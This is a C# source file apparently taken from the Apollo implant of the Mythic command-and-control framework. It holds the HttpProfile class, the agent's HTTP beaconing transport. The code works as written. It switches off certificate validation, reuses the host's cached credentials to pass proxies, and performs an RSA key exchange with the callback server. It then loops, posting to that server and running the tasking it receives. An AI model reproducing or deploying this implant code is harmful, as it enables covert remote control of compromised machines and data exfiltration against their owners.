﻿using System;
using System.Collections.Generic;
using System.Linq;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Net;
using ApolloInterop.Enums.ApolloEnums;

namespace HttpTransport
{
    public class HttpProfile : C2Profile, IC2Profile
    {
        private int CallbackInterval;
        private double CallbackJitter;
        private int CallbackPort;
        private string CallbackHost;
        private string PostUri;
        // synthesis of CallbackHost, CallbackPort, PostUri
        private string Endpoint;
        private bool EncryptedExchangeCheck;
        private string ProxyHost;
        private int ProxyPort;
        private string ProxyUser;
        private string ProxyPass;
        private string KillDate;
        // synthesis of ProxyHost and ProxyPort
        private string ProxyAddress;
        private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
        private bool _uuidNegotiated = false;
        private RSAKeyGenerator rsa = null;

        private string ParseURLAndPort(string host, int port)
        {
            string final_url = "";
            int last_slash = -1;
            if(port == 443 && host.StartsWith("https://")){
                final_url = host;
            } else if(port == 80 && host.StartsWith("http://")){
                final_url = host;
            } else {
                last_slash = host.Substring(8).IndexOf("/");
                if(last_slash == -1){
                    final_url = string.Format("{0}:{1}", host, port);
                } else {
                    last_slash += 8;
                    final_url = host.Substring(0, last_slash) + $":{port}" + host.Substring(last_slash);
                }
            }
            return final_url;
        }
        public HttpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = double.Parse(data["callback_jitter"]);
            CallbackPort = int.Parse(data["callback_port"]);
            CallbackHost = data["callback_host"];
            PostUri = data["post_uri"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            ProxyHost = data["proxy_host"];
            if(data["proxy_port"].Length > 0){
                ProxyPort = int.Parse(data["proxy_port"]);
                if(ProxyHost.Length > 0){
                    ProxyAddress = this.ParseURLAndPort(ProxyHost, ProxyPort);
                }
            }

            rsa = agent.GetApi().NewRSAKeyPair(4096);


            if (PostUri[0] != '/')
            {
                PostUri = $"/{PostUri}";
            }
            Endpoint = this.ParseURLAndPort(CallbackHost, CallbackPort);
            //Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
            ProxyUser = data["proxy_user"];
            ProxyPass = data["proxy_pass"];
            KillDate = data["killdate"];

            string[] reservedStrings = new[]
            {
                "callback_interval",
                "callback_jitter",
                "callback_port",
                "callback_host",
                "post_uri",
                "encrypted_exchange_check",
                "proxy_host",
                "proxy_port",
                "proxy_user",
                "proxy_pass",
                "killdate",
            };
            
            foreach(string k in data.Keys)
            {
                if (!reservedStrings.Contains(k))
                {
                    _additionalHeaders.Add(k, data[k]);
                }
            }
            
            // Disable certificate validation on web requests
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            Agent.SetSleep(CallbackInterval, CallbackJitter);
        }

        public void Start()
        {
            bool first = true;
            while(Agent.IsAlive())
            {
                bool bRet = GetTasking(resp => Agent.GetTaskManager().ProcessMessageResponse(resp));

                if (!bRet)
                {
                    break;
                }

                Agent.Sleep();
            }
        }

        private bool GetTasking(OnResponse<MessageResponse> onResp) => Agent.GetTaskManager().CreateTaskingMessage(msg => SendRecv(msg, onResp));
        
        public bool IsOneWay() => false;

        public bool Send<T>(T message) => throw new Exception("HttpProfile does not support Send only.");
        public bool Recv<T>(OnResponse<T> onResponse) => throw new Exception("HttpProfile does not support Recv only.");
        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp) => throw new NotImplementedException("HttpProfile does not support Recv only.");
        

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            WebClient webClient = new WebClient();
            if (!string.IsNullOrEmpty(ProxyHost) &&
                !string.IsNullOrEmpty(ProxyUser) &&
                !string.IsNullOrEmpty(ProxyPass))
            {
                webClient.Proxy = (IWebProxy) new WebProxy()
                {
                    Address = new Uri(ProxyAddress),
                    Credentials = new NetworkCredential(ProxyUser, ProxyPass),
                    UseDefaultCredentials = false,
                    BypassProxyOnLocal = false
                };
            } 
            else 
            {
                // Use Default Proxy and Cached Credentials for Internet Access
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
            }
            
            foreach(string k in _additionalHeaders.Keys)
            {
                webClient.Headers.Add(k, _additionalHeaders[k]);
            }

            webClient.BaseAddress = Endpoint;
            string sMsg = Serializer.Serialize(message);
            try
            {
                var response = webClient.UploadString(PostUri, sMsg);
                onResponse(Serializer.Deserialize<TResult>(response));
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        // Only really used for bind servers so this returns empty
        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = this.rsa.ExportPublicKey(),
                    SessionID = this.rsa.SessionId
                };

                if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(handshake1, delegate(EKEHandshakeResponse respHandshake)
                {
                    byte[] tmpKey = this.rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    Agent.SetUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            string msg = Serializer.Serialize(checkinMsg);
            return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
            {
                Connected = true;
                if (!_uuidNegotiated)
                {
                    ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                    Agent.SetUUID(mResp.ID);
                    _uuidNegotiated = true;
                }
                return onResp(mResp);
            });
        }

    }
}
